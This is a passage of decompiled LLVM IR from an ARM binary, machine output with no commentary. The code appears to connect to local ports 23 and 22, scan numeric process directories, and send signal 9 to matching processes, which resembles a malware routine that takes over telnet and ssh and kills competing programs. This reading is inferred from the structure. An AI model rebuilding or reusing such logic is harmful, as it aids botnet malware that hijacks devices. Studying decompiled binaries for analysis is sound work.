  uselistorder label %dec_label_pc_e810.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e800.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e798, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e740, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e71c, { 1, 0 }
  uselistorder label %dec_label_pc_e6c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e624.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_e674, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_e63c, { 1, 0 }
  uselistorder label %dec_label_pc_e5f4, { 1, 0 }
}

define i32 @function_eab0(i32 %arg1) local_unnamed_addr {
dec_label_pc_eab0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-4312 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-8408 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-8428 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_eab0 = load i32, i32* @r4, align 4
  store i32 %v3_eab0, i32* %stack_var_-36, align 4
  %v6_eab0 = load i32, i32* @r5, align 4
  %v9_eab0 = load i32, i32* @r6, align 4
  %v12_eab0 = load i32, i32* @r7, align 4
  %v15_eab0 = load i32, i32* @r8, align 4
  %v18_eab0 = load i32, i32* @sb, align 4
  %v21_eab0 = load i32, i32* @sl, align 4
  %v24_eab0 = load i32, i32* @fp, align 4
  %v2_eac0 = call i32 @function_13924(i32* null)
  store i32 %v2_eac0, i32* @r7, align 4
  %v0_eac8 = call i32 @function_13680()
  %v7_eacc = icmp eq i32 %v0_eac8, -1
  %. = zext i1 %v7_eacc to i32
  %tmp212 = icmp slt i32 %v0_eac8, 1
  %storemerge174 = select i1 %tmp212, i32 %., i32 1
  store i32 %storemerge174, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1ec84.97 to i32), i32* %r3.global-to-local, align 4
  %v2_eae8 = icmp eq i32 %storemerge174, 0
  store i32 %v0_eac8, i32* @global_var_1ec84.97, align 4
  br i1 %v2_eae8, label %dec_label_pc_eb00, label %dec_label_pc_eaf4

dec_label_pc_eaf4:                                ; preds = %dec_label_pc_eccc, %dec_label_pc_ebb4, %dec_label_pc_eab0
  %v29_eafc = phi i32 [ %v3_ec58, %dec_label_pc_ebb4 ], [ %v0_eac8, %dec_label_pc_eab0 ], [ 0, %dec_label_pc_eccc ]
  %v2_eafc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_eafc, i32* @r4, align 4
  store i32 %v6_eab0, i32* @r5, align 4
  store i32 %v9_eab0, i32* @r6, align 4
  store i32 %v12_eab0, i32* @r7, align 4
  store i32 %v15_eab0, i32* @r8, align 4
  store i32 %v18_eab0, i32* @sb, align 4
  store i32 %v21_eab0, i32* @sl, align 4
  store i32 %v24_eab0, i32* @fp, align 4
  ret i32 %v29_eafc

dec_label_pc_eb00:                                ; preds = %dec_label_pc_eab0
  %v2_eb00 = ptrtoint i32* %stack_var_-236 to i32
  store i32 %v2_eb00, i32* %r1.global-to-local, align 4
  store i32 2, i32* @r6, align 4
  store i32 2, i32* %stack_var_-72, align 4
  %v1_eb18 = call i32 @function_e544(i32 5888)
  store i32 23, i32* %r3.global-to-local, align 4
  %v0_eb24 = load i32, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_eb2c = load i32, i32* @r5, align 4
  store i32 %v0_eb2c, i32* %r2.global-to-local, align 4
  %v3_eb38 = call i32 @function_13f50(i32 %v0_eb24, i32 1, i32 %v0_eb2c)
  %v7_eb3c = icmp eq i32 %v3_eb38, -1
  store i32 %v3_eb38, i32* @r4, align 4
  br i1 %v7_eb3c, label %dec_label_pc_eb64, label %dec_label_pc_eb48

dec_label_pc_eb48:                                ; preds = %dec_label_pc_eb00
  %v2_eb4c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_eb4c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_eb54 = bitcast i32* %stack_var_-72 to %sockaddr*
  %v4_eb54 = call i32 @function_13d80(i32 %v3_eb38, %sockaddr* %v3_eb54, i32 16)
  %v0_eb58 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_eb60 = call i32 @function_13e34(i32 %v0_eb58, i32 1)
  br label %dec_label_pc_eb64

dec_label_pc_eb64:                                ; preds = %dec_label_pc_eb00, %dec_label_pc_eb48
  %v1_eb68 = call i32 @function_e544(i32 5632)
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_eb74 = load i32, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_eb7c = load i32, i32* @r5, align 4
  store i32 %v0_eb7c, i32* %r2.global-to-local, align 4
  %v3_eb88 = call i32 @function_13f50(i32 %v0_eb74, i32 1, i32 %v0_eb7c)
  %v7_eb8c = icmp eq i32 %v3_eb88, -1
  store i32 %v3_eb88, i32* @r4, align 4
  br i1 %v7_eb8c, label %dec_label_pc_ebb4, label %dec_label_pc_eb98

dec_label_pc_eb98:                                ; preds = %dec_label_pc_eb64
  %v2_eb9c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_eb9c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_eba4 = bitcast i32* %stack_var_-72 to %sockaddr*
  %v4_eba4 = call i32 @function_13d80(i32 %v3_eb88, %sockaddr* %v3_eba4, i32 16)
  %v0_eba8 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_ebb0 = call i32 @function_13e34(i32 %v0_eba8, i32 1)
  br label %dec_label_pc_ebb4

dec_label_pc_ebb4:                                ; preds = %dec_label_pc_eb64, %dec_label_pc_eb98
  %v1_ebb8 = call i32 @function_14a84(i32 5)
  %v1_ebc0 = call i32 @function_14100(i32 4096)
  store i32 ptrtoint (i32* @global_var_1ebe8.103 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec80.105 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_ebc0, i32* %r2.global-to-local, align 4
  %v0_ebd0 = load i32, i32* @r5, align 4
  %v1_ebd0 = trunc i32 %v0_ebd0 to i8
  %v3_ebd0 = inttoptr i32 %v1_ebc0 to i8*
  store i8 %v1_ebd0, i8* %v3_ebd0, align 1
  %v0_ebd8 = load i32, i32* @r5, align 4
  %v1_ebd8 = load i32, i32* %r3.global-to-local, align 4
  %v2_ebd8 = inttoptr i32 %v1_ebd8 to i32*
  store i32 %v0_ebd8, i32* %v2_ebd8, align 4
  %v0_ebdc = load i32, i32* %r2.global-to-local, align 4
  %v1_ebdc = load i32, i32* %r1.global-to-local, align 4
  %v2_ebdc = inttoptr i32 %v1_ebdc to i32*
  store i32 %v0_ebdc, i32* %v2_ebdc, align 4
  %v1_ebe0 = call i32 @function_1236c(i32 6)
  %v1_ebe8 = call i32 @function_1236c(i32 7)
  %v0_ebec = load i32, i32* @r5, align 4
  store i32 %v0_ebec, i32* %r1.global-to-local, align 4
  %v2_ebf4 = inttoptr i32 %v0_ebec to i32*
  %v3_ebf4 = call i32 @function_12288(i32 6, i32* %v2_ebf4)
  %v2_ebfc = ptrtoint i32* %stack_var_-8408 to i32
  store i32 %v2_ebfc, i32* @r8, align 4
  store i32 %v3_ebf4, i32* %r1.global-to-local, align 4
  store i32 %v2_ebfc, i32* @r0, align 4
  %v2_ec08 = bitcast i32* %stack_var_-8408 to i8*
  %v3_ec08 = call i32 @function_12cbc(i8* %v2_ec08, i32 %v3_ebf4)
  %v0_ec0c = load i32, i32* @r8, align 4
  %v2_ec0c = add i32 %v0_ec0c, %v3_ec08
  store i32 %v2_ec0c, i32* @r4, align 4
  %v0_ec10 = call i32 @function_136ac()
  %v2_ec18 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_ec18, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_ec20 = trunc i32 %v0_ec10 to i8
  %v4_ec20 = call i32 @function_13188(i8 %v3_ec20, i32 10, i32 %v2_ec18)
  store i32 %v4_ec20, i32* %r1.global-to-local, align 4
  %v0_ec28 = load i32, i32* @r4, align 4
  store i32 %v0_ec28, i32* @r0, align 4
  %v2_ec2c = inttoptr i32 %v0_ec28 to i8*
  %v3_ec2c = call i32 @function_12cbc(i8* %v2_ec2c, i32 %v4_ec20)
  %v0_ec30 = load i32, i32* @r5, align 4
  store i32 %v0_ec30, i32* %r1.global-to-local, align 4
  %v0_ec34 = load i32, i32* @r4, align 4
  %v2_ec34 = add i32 %v0_ec34, %v3_ec2c
  store i32 %v2_ec34, i32* @r4, align 4
  %v2_ec3c = inttoptr i32 %v0_ec30 to i32*
  %v3_ec3c = call i32 @function_12288(i32 7, i32* %v2_ec3c)
  store i32 %v3_ec3c, i32* %r1.global-to-local, align 4
  %v0_ec44 = load i32, i32* @r4, align 4
  store i32 %v0_ec44, i32* @r0, align 4
  %v2_ec48 = inttoptr i32 %v0_ec44 to i8*
  %v3_ec48 = call i32 @function_12cbc(i8* %v2_ec48, i32 %v3_ec3c)
  %v0_ec4c = load i32, i32* @r5, align 4
  store i32 %v0_ec4c, i32* %r1.global-to-local, align 4
  store i32 %v3_ec48, i32* @r6, align 4
  %v3_ec58 = call i32 @function_13780(i8* %v2_ec08, i32 %v0_ec4c)
  %v7_ec5c = icmp eq i32 %v3_ec58, -1
  br i1 %v7_ec5c, label %dec_label_pc_eaf4, label %dec_label_pc_ec64

dec_label_pc_ec64:                                ; preds = %dec_label_pc_ebb4
  %v1_ec64 = call i32 @function_13654(i32 %v3_ec58)
  %v1_ec6c = call i32 @function_122b4(i32 6)
  %v1_ec74 = call i32 @function_122b4(i32 7)
  store i32 ptrtoint (i32* @global_var_1ec80.105 to i32), i32* %r3.global-to-local, align 4
  %v2_ec80 = load i32, i32* @global_var_1ec80.105, align 4
  store i32 %v2_ec80, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v4_ec8c = call i32 @function_13848(i8* %v2_ec08, i32 %v2_ec80, i32 4095)
  %v7_ec90 = icmp eq i32 %v4_ec8c, -1
  br i1 %v7_ec90, label %.thread5.thread, label %bb215

.thread5.thread:                                  ; preds = %dec_label_pc_ec64
  %v0_ec9c54 = load i32, i32* @r4, align 4
  %v1_ec9c55 = load i32, i32* @r6, align 4
  %v2_ec9c56 = add i32 %v1_ec9c55, %v0_ec9c54
  store i32 %v2_ec9c56, i32* %r1.global-to-local, align 4
  br label %bb216

bb215:                                            ; preds = %dec_label_pc_ec64
  %v3_ec98 = load i32, i32* @global_var_1ec80.105, align 4
  store i32 %v3_ec98, i32* %r3.global-to-local, align 4
  %v0_ec9c = load i32, i32* @r4, align 4
  %v1_ec9c = load i32, i32* @r6, align 4
  %v2_ec9c = add i32 %v1_ec9c, %v0_ec9c
  store i32 %v2_ec9c, i32* %r1.global-to-local, align 4
  %v1_eca0 = load i32, i32* @r5, align 4
  %v2_eca0 = trunc i32 %v1_eca0 to i8
  %v5_eca0 = add i32 %v3_ec98, %v4_ec8c
  %v6_eca0 = inttoptr i32 %v5_eca0 to i8*
  store i8 %v2_eca0, i8* %v6_eca0, align 1
  %v1_eca4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb216

bb216:                                            ; preds = %.thread5.thread, %bb215
  %v1_eca4 = phi i32 [ %v2_ec9c56, %.thread5.thread ], [ %v1_eca4.pre, %bb215 ]
  %v0_eca4 = load i32, i32* @r8, align 4
  %v2_eca4 = sub i32 %v1_eca4, %v0_eca4
  store i32 %v2_eca4, i32* %r1.global-to-local, align 4
  %v2_ecac = call i32 @function_12d34(i32 %v2_ebfc, i32 %v2_eca4)
  %v2_ecb8 = ptrtoint i32* %stack_var_-4312 to i32
  store i32 %v2_ecb8, i32* %r1.global-to-local, align 4
  store i32 %v2_ecb8, i32* %stack_var_-8428, align 4
  %v0_ecc0 = load i32, i32* @r5, align 4
  %v0_ecc4 = load i32, i32* @r7, align 4
  store i32 %v0_ecc4, i32* @r4, align 4
  store i32 400, i32* @r5, align 4
  %v2_edc0 = ptrtoint i32* %stack_var_-152 to i32
  %v2_edc4 = bitcast i32* %stack_var_-152 to i8*
  %v2_ee10 = ptrtoint i32* %stack_var_-216 to i32
  %v2_ee14 = bitcast i32* %stack_var_-216 to i8*
  %v2_ef84 = ptrtoint i32* %stack_var_-44 to i32
  %v2_ef94 = ptrtoint i32* %stack_var_-48 to i32
  %v2_efa8 = ptrtoint i32* %stack_var_-52 to i32
  %v2_efbc = ptrtoint i32* %stack_var_-40 to i32
  %v2_efd4 = ptrtoint i32* %stack_var_-56 to i32
  %v2_ee8c = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_eccc

dec_label_pc_eccc:                                ; preds = %dec_label_pc_ed84, %bb216
  %stack_var_-8420.0 = phi i32 [ %v0_ecc0, %bb216 ], [ %stack_var_-8420.3, %dec_label_pc_ed84 ]
  %v1_ecd0 = call i32 @function_1236c(i32 6)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ecdc = call i32 @function_12288(i32 6, i32* null)
  store i32 %v3_ecdc, i32* @r0, align 4
  %v1_ece0 = call i32 @function_13a5c(i32 %v3_ecdc)
  store i32 %v1_ece0, i32* @sl, align 4
  %v2_ece4 = icmp eq i32 %v1_ece0, 0
  br i1 %v2_ece4, label %dec_label_pc_eaf4, label %dec_label_pc_ecec

dec_label_pc_ecec:                                ; preds = %dec_label_pc_eccc
  %v1_ecf0 = call i32 @function_122b4(i32 6)
  %v0_ecf4117 = load i32, i32* @sl, align 4
  %v1_ecf8118 = inttoptr i32 %v0_ecf4117 to i32*
  %v2_ecf8119 = call i32 @function_13b58(i32* %v1_ecf8118)
  %v2_ecfc121 = icmp eq i32 %v2_ecf8119, 0
  br i1 %v2_ecfc121, label %dec_label_pc_ed84, label %dec_label_pc_ed04.preheader

dec_label_pc_ed04.preheader:                      ; preds = %dec_label_pc_ecec, %dec_label_pc_ecf4.backedge
  %v0_ed04133 = phi i32 [ %v2_ecf8, %dec_label_pc_ecf4.backedge ], [ %v2_ecf8119, %dec_label_pc_ecec ]
  %stack_var_-8420.1122 = phi i32 [ %stack_var_-8420.1.be, %dec_label_pc_ecf4.backedge ], [ %stack_var_-8420.0, %dec_label_pc_ecec ]
  br label %dec_label_pc_ed04

dec_label_pc_ed04:                                ; preds = %dec_label_pc_ed04.preheader, %dec_label_pc_ed6c
  %v0_ed14 = phi i32 [ %v2_ed78, %dec_label_pc_ed6c ], [ %v0_ed04133, %dec_label_pc_ed04.preheader ]
  %stack_var_-8420.2 = phi i32 [ %v1_ed28, %dec_label_pc_ed6c ], [ %stack_var_-8420.1122, %dec_label_pc_ed04.preheader ]
  %v1_ed04 = add i32 %v0_ed14, 11
  %v2_ed04 = inttoptr i32 %v1_ed04 to i8*
  %v3_ed04 = load i8, i8* %v2_ed04, align 1
  %v4_ed04 = zext i8 %v3_ed04 to i32
  %v1_ed08 = add nsw i32 %v4_ed04, -48
  store i32 %v1_ed08, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_ed08, 9
  br i1 %tmp, label %dec_label_pc_ecf4.backedge, label %dec_label_pc_ed14

dec_label_pc_ed14:                                ; preds = %dec_label_pc_ed04
  store i32 %v1_ed04, i32* @r6, align 4
  %v2_ed1c = call i32 @function_14844(i8* %v2_ed04)
  %v0_ed24 = load i32, i32* @r5, align 4
  %v1_ed28 = add i32 %stack_var_-8420.2, 1
  store i32 %v1_ed28, i32* %r2.global-to-local, align 4
  store i32 %v2_ed1c, i32* @r7, align 4
  %v5_ed34 = icmp slt i32 %v0_ed24, %v2_ed1c
  %v2_ed94 = call i32 @function_13924(i32* null)
  br i1 %v5_ed34, label %dec_label_pc_ed90, label %dec_label_pc_ed38

dec_label_pc_ed38:                                ; preds = %dec_label_pc_ed14
  %v0_ed40 = load i32, i32* @r4, align 4
  %v2_ed40 = sub i32 %v2_ed94, %v0_ed40
  %v7_ed48 = icmp slt i32 %v2_ed40, 601
  br i1 %v7_ed48, label %dec_label_pc_ed50, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_ed38
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_ecf4.backedge

dec_label_pc_ed50:                                ; preds = %dec_label_pc_ed38
  %v0_ed50 = load i32, i32* @r7, align 4
  %v7_ed54 = icmp slt i32 %v0_ed50, 401
  br i1 %v7_ed54, label %dec_label_pc_ecf4.backedge, label %dec_label_pc_ed58

dec_label_pc_ed58:                                ; preds = %dec_label_pc_ed50
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_ed60 = call i32 @function_133b0(i32 %v1_ed28, i32 10)
  %v2_ed64 = icmp eq i32 %v2_ed60, 0
  br i1 %v2_ed64, label %dec_label_pc_ed6c, label %dec_label_pc_ecf4.backedge

dec_label_pc_ed6c:                                ; preds = %dec_label_pc_ed58
  %v1_ed70 = call i32 @function_14a84(i32 1)
  %v0_ed74 = load i32, i32* @sl, align 4
  %v1_ed78 = inttoptr i32 %v0_ed74 to i32*
  %v2_ed78 = call i32 @function_13b58(i32* %v1_ed78)
  %v2_ed7c = icmp eq i32 %v2_ed78, 0
  br i1 %v2_ed7c, label %dec_label_pc_ed84, label %dec_label_pc_ed04

dec_label_pc_ed84:                                ; preds = %dec_label_pc_ecf4.backedge, %dec_label_pc_ed6c, %dec_label_pc_ecec
  %stack_var_-8420.3 = phi i32 [ %stack_var_-8420.0, %dec_label_pc_ecec ], [ %v1_ed28, %dec_label_pc_ed6c ], [ %stack_var_-8420.1.be, %dec_label_pc_ecf4.backedge ]
  %v0_ed84 = load i32, i32* @sl, align 4
  %v1_ed88 = inttoptr i32 %v0_ed84 to i32*
  %v2_ed88 = call i32 @function_139a8(i32* %v1_ed88)
  br label %dec_label_pc_eccc

dec_label_pc_ed90:                                ; preds = %dec_label_pc_ed14
  %v1_eda0 = call i32 @function_1236c(i32 6)
  %v1_eda8 = call i32 @function_1236c(i32 7)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_edb4 = call i32 @function_12288(i32 6, i32* null)
  store i32 %v3_edb4, i32* %r1.global-to-local, align 4
  store i32 %v2_edc0, i32* @r0, align 4
  %v3_edc4 = call i32 @function_12cbc(i8* %v2_edc4, i32 %v3_edb4)
  store i32 %v2_edc0, i32* %r3.global-to-local, align 4
  %v2_edd0 = add i32 %v3_edc4, %v2_edc0
  store i32 %v2_edd0, i32* %r5.global-to-local, align 4
  %v0_edd4 = load i32, i32* @r6, align 4
  store i32 %v0_edd4, i32* %r1.global-to-local, align 4
  store i32 %v2_edd0, i32* @r0, align 4
  %v2_eddc = inttoptr i32 %v2_edd0 to i8*
  %v3_eddc = call i32 @function_12cbc(i8* %v2_eddc, i32 %v0_edd4)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_edec = call i32 @function_12288(i32 7, i32* null)
  store i32 %v3_edec, i32* %r1.global-to-local, align 4
  %v0_edf4 = load i32, i32* %r5.global-to-local, align 4
  %v2_edf4 = add i32 %v3_eddc, %v0_edf4
  store i32 %v2_edf4, i32* @r0, align 4
  %v2_edf8 = inttoptr i32 %v2_edf4 to i8*
  %v3_edf8 = call i32 @function_12cbc(i8* %v2_edf8, i32 %v3_edec)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ee04 = call i32 @function_12288(i32 6, i32* null)
  store i32 %v3_ee04, i32* %r1.global-to-local, align 4
  store i32 %v2_ee10, i32* @r0, align 4
  %v3_ee14 = call i32 @function_12cbc(i8* %v2_ee14, i32 %v3_ee04)
  %v2_ee20 = add i32 %v3_ee14, %v2_ee10
  store i32 %v2_ee20, i32* @r5, align 4
  %v0_ee24 = load i32, i32* @r6, align 4
  store i32 %v0_ee24, i32* %r1.global-to-local, align 4
  store i32 %v2_ee20, i32* @r0, align 4
  %v2_ee2c = inttoptr i32 %v2_ee20 to i8*
  %v3_ee2c = call i32 @function_12cbc(i8* %v2_ee2c, i32 %v0_ee24)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_ee2c, i32* @r4, align 4
  %v3_ee3c = call i32 @function_12288(i32 11, i32* null)
  store i32 %v3_ee3c, i32* %r1.global-to-local, align 4
  %v0_ee44 = load i32, i32* @r5, align 4
  %v1_ee44 = load i32, i32* @r4, align 4
  %v2_ee44 = add i32 %v1_ee44, %v0_ee44
  store i32 %v2_ee44, i32* @r0, align 4
  %v2_ee48 = inttoptr i32 %v2_ee44 to i8*
  %v3_ee48 = call i32 @function_12cbc(i8* %v2_ee48, i32 %v3_ee3c)
  %v1_ee50 = call i32 @function_122b4(i32 6)
  %v1_ee58 = call i32 @function_122b4(i32 7)
  store i32 4095, i32* %r2.global-to-local, align 4
  %v2_ee6c = load i32, i32* %stack_var_-8428, align 4
  store i32 %v2_ee6c, i32* %r1.global-to-local, align 4
  %v4_ee70 = call i32 @function_13848(i8* %v2_edc4, i32 %v2_ee6c, i32 4095)
  %v7_ee78 = icmp eq i32 %v4_ee70, -1
  store i32 %v4_ee70, i32* @r5, align 4
  store i32 -4276, i32* @r2, align 4
  br i1 %v7_ee78, label %dec_label_pc_ef40, label %dec_label_pc_ee88

dec_label_pc_ee88:                                ; preds = %dec_label_pc_ed90
  store i32 %v2_ee8c, i32* %r1.global-to-local, align 4
  %v2_ee90 = add i32 %v4_ee70, %v2_ee8c
  store i32 %v2_ee90, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_ee98 = add i32 %v2_ee90, -4276
  %v5_ee98 = inttoptr i32 %v4_ee98 to i8*
  store i8 0, i8* %v5_ee98, align 1
  %v1_eea0 = call i32 @function_1236c(i32 10)
  %v0_eea4 = load i32, i32* @r4, align 4
  store i32 %v0_eea4, i32* %r1.global-to-local, align 4
  %v2_eeac = inttoptr i32 %v0_eea4 to i32*
  %v3_eeac = call i32 @function_12288(i32 10, i32* %v2_eeac)
  %v0_eeb0 = load i32, i32* @r5, align 4
  %v1_eeb0 = add i32 %v0_eeb0, -1
  store i32 %v1_eeb0, i32* @r1, align 4
  store i32 %v3_eeac, i32* %r2.global-to-local, align 4
  %v2_eeb8 = load i32, i32* %stack_var_-8428, align 4
  %v3_eebc = inttoptr i32 %v2_eeb8 to i8*
  %v4_eebc = call i32 @function_12fe8(i8* %v3_eebc, i32 %v1_eeb0, i32 %v3_eeac)
  %v7_eec0 = icmp eq i32 %v4_eebc, -1
  br i1 %v7_eec0, label %dec_label_pc_eedc, label %dec_label_pc_eec8

dec_label_pc_eec8:                                ; preds = %dec_label_pc_ee88
  %v2_eec8 = load i32, i32* %stack_var_-8428, align 4
  %v1_eecc = inttoptr i32 %v2_eec8 to i8*
  %v2_eecc = call i32 @function_13950(i8* %v1_eecc)
  %v0_eed0 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_eed8 = call i32 @function_13754(i32 %v0_eed0, i32 9)
  br label %dec_label_pc_eedc

dec_label_pc_eedc:                                ; preds = %dec_label_pc_ee88, %dec_label_pc_eec8
  %v1_eee0 = call i32 @function_122b4(i32 10)
  %v0_eee4 = call i32 @function_136ac()
  %v0_eee8 = load i32, i32* @r7, align 4
  %v9_eee8 = icmp eq i32 %v0_eee8, %v0_eee4
  br i1 %v9_eee8, label %dec_label_pc_ef14, label %dec_label_pc_eef0

dec_label_pc_eef0:                                ; preds = %dec_label_pc_eedc
  %v0_eef0 = call i32 @function_136d8()
  %v0_eef4 = load i32, i32* @r7, align 4
  %v9_eef4 = icmp eq i32 %v0_eef4, %v0_eef0
  br i1 %v9_eef4, label %dec_label_pc_ef14, label %dec_label_pc_eefc

dec_label_pc_eefc:                                ; preds = %dec_label_pc_eef0
  store i32 ptrtoint (i32* @global_var_1ec80.105 to i32), i32* %r2.global-to-local, align 4
  %v2_ef00 = load i32, i32* %stack_var_-8428, align 4
  %v2_ef04 = load i32, i32* @global_var_1ec80.105, align 4
  store i32 %v2_ef04, i32* %r1.global-to-local, align 4
  %v2_ef08 = inttoptr i32 %v2_ef00 to i8*
  %v3_ef08 = call i32 @function_13074(i8* %v2_ef08, i32 %v2_ef04)
  %v2_ef0c = icmp eq i32 %v3_ef08, 0
  br i1 %v2_ef0c, label %dec_label_pc_ef20, label %dec_label_pc_eefc.dec_label_pc_ef14_crit_edge

dec_label_pc_eefc.dec_label_pc_ef14_crit_edge:    ; preds = %dec_label_pc_eefc
  %v0_ef18.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_ef14

dec_label_pc_ef14:                                ; preds = %dec_label_pc_eefc.dec_label_pc_ef14_crit_edge, %dec_label_pc_eef0, %dec_label_pc_eedc
  %v0_ef18 = phi i32 [ %v0_ef18.pre, %dec_label_pc_eefc.dec_label_pc_ef14_crit_edge ], [ %v0_eef0, %dec_label_pc_eef0 ], [ %v0_eee4, %dec_label_pc_eedc ]
  store i32 %v2_ed94, i32* @r4, align 4
  store i32 %v0_ef18, i32* @r5, align 4
  br label %dec_label_pc_ecf4.backedge

dec_label_pc_ecf4.backedge:                       ; preds = %dec_label_pc_ed58, %dec_label_pc_ed50, %dec_label_pc_ed04, %dec_label_pc_ef14, %dec_label_pc_f1c4, %.thread11
  %stack_var_-8420.1.be = phi i32 [ %v1_ed28, %dec_label_pc_f1c4 ], [ %v1_ed28, %dec_label_pc_ef14 ], [ %v1_ed28, %.thread11 ], [ %stack_var_-8420.2, %dec_label_pc_ed04 ], [ %v1_ed28, %dec_label_pc_ed50 ], [ %v1_ed28, %dec_label_pc_ed58 ]
  %v0_ecf4 = load i32, i32* @sl, align 4
  %v1_ecf8 = inttoptr i32 %v0_ecf4 to i32*
  %v2_ecf8 = call i32 @function_13b58(i32* %v1_ecf8)
  %v2_ecfc = icmp eq i32 %v2_ecf8, 0
  br i1 %v2_ecfc, label %dec_label_pc_ed84, label %dec_label_pc_ed04.preheader

dec_label_pc_ef20:                                ; preds = %dec_label_pc_eefc
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_ef24 = load i32, i32* %stack_var_-8428, align 4
  %v2_ef28 = inttoptr i32 %v2_ef24 to i8*
  %v3_ef28 = call i32 @function_13780(i8* %v2_ef28, i32 0)
  %v7_ef2c = icmp eq i32 %v3_ef28, -1
  store i32 %v3_ef28, i32* @r4, align 4
  br i1 %v7_ef2c, label %dec_label_pc_f1f8, label %dec_label_pc_ef38

dec_label_pc_ef38:                                ; preds = %dec_label_pc_ef20, %dec_label_pc_f1f8
  %v0_ef38 = phi i32 [ %v3_ef28, %dec_label_pc_ef20 ], [ %v0_ef38.pre, %dec_label_pc_f1f8 ]
  %v1_ef3c = call i32 @function_13654(i32 %v0_ef38)
  br label %dec_label_pc_ef40

dec_label_pc_ef40:                                ; preds = %dec_label_pc_ed90, %dec_label_pc_ef38
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ef4c = call i32 @function_13780(i8* %v2_edc4, i32 0)
  %v7_ef50 = icmp eq i32 %v3_ef4c, -1
  br i1 %v7_ef50, label %dec_label_pc_f1c4, label %dec_label_pc_ef5c

dec_label_pc_ef5c:                                ; preds = %dec_label_pc_ef40
  %v1_ef60 = call i32 @function_1236c(i32 12)
  %v1_ef68 = call i32 @function_1236c(i32 13)
  %v1_ef70 = call i32 @function_1236c(i32 14)
  %v1_ef78 = call i32 @function_1236c(i32 15)
  %v1_ef80 = call i32 @function_1236c(i32 16)
  store i32 %v2_ef84, i32* %r1.global-to-local, align 4
  %v3_ef8c = call i32 @function_12288(i32 12, i32* nonnull %stack_var_-44)
  store i32 %v2_ef94, i32* %r1.global-to-local, align 4
  store i32 %v3_ef8c, i32* @r5, align 4
  %v3_efa0 = call i32 @function_12288(i32 13, i32* nonnull %stack_var_-48)
  store i32 %v2_efa8, i32* %r1.global-to-local, align 4
  store i32 %v3_efa0, i32* @r6, align 4
  %v3_efb4 = call i32 @function_12288(i32 14, i32* nonnull %stack_var_-52)
  store i32 %v2_efbc, i32* %r1.global-to-local, align 4
  store i32 %v3_efb4, i32* @sb, align 4
  %v3_efc8 = call i32 @function_12288(i32 15, i32* nonnull %stack_var_-40)
  store i32 %v3_efc8, i32* @fp, align 4
  store i32 %v2_efd4, i32* %r1.global-to-local, align 4
  %v3_efdc = call i32 @function_12288(i32 16, i32* nonnull %stack_var_-56)
  store i32 %v2_ebfc, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v4_eff0114 = call i32 @function_1381c(i32 %v3_ef4c, i32* nonnull %stack_var_-8408, i32 4096)
  %tmp217 = icmp slt i32 %v4_eff0114, 1
  br i1 %tmp217, label %dec_label_pc_f208, label %dec_label_pc_effc

dec_label_pc_effc:                                ; preds = %dec_label_pc_ef5c, %dec_label_pc_efe4.backedge
  %v0_f084105 = phi i32 [ %v4_eff0, %dec_label_pc_efe4.backedge ], [ %v4_eff0114, %dec_label_pc_ef5c ]
  store i32 %v2_eb00, i32* %r3.global-to-local, align 4
  %v3_f000 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_f000, i32* @r4, align 4
  %v5_f008 = icmp slt i32 %v0_f084105, %v3_f000
  br i1 %v5_f008, label %dec_label_pc_f018, label %dec_label_pc_f0c4.lr.ph

